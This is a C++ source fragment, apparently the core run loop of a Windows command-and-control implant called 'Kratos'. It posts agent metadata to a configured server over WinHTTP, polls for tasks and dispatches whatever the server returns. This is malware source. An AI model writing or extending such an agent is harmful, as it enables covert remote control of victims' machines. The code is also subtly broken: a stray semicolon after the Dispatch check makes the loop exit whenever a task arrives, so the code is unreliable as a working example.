#include "agent/core.h"
#include "packager/packager.h"
#include "net/net.h"

Kratos* kratos = NULL;


/*
	kratos->Init() Allocates core NetMgr and other critical stuff
	->
	Init calls, this->LoadApis(), this loads all required apis
	Init calls, this->LoadConfig(), this pulls config, parses and saves values
	Init calls, NetMgr->Init(), this loads winhttp, gets apis, saves internal http info(domain, paths, port etc)
	returns
*/



BOOL Kratos::Run( ) {

	packager->NewPacker( );
	packager->PrepareMetaData( this->AgentID );

	for ( ;; ) {
		if ( ! net->Post( packager->PackerPointer( ), ( SIZE_T )packager->PackerSize ) ) {
			return FALSE;
		}

		if ( net->DataSize( ) == 0) {
			packager->Pack4( MSG_GETTASK );
		}
		else {
			if ( ! tasker->Dispatch( ) ); { return FALSE; }
		}
		/*packager->NewUnPacker( net->Data( ), net->DataSize( ) );

		INT32 RespCode = packager->UnPack4( );
		if ( RespCode != RESP_NO_TASKS ) {
			packager->Pack4( MSG_OUTPUT );
			tasker->Dispatch( net->Data( ), net->DataSize( ) );
		}
		else {
			packager->Pack4( MSG_GETTASK );
		}*/

		


	}



	return TRUE;
}



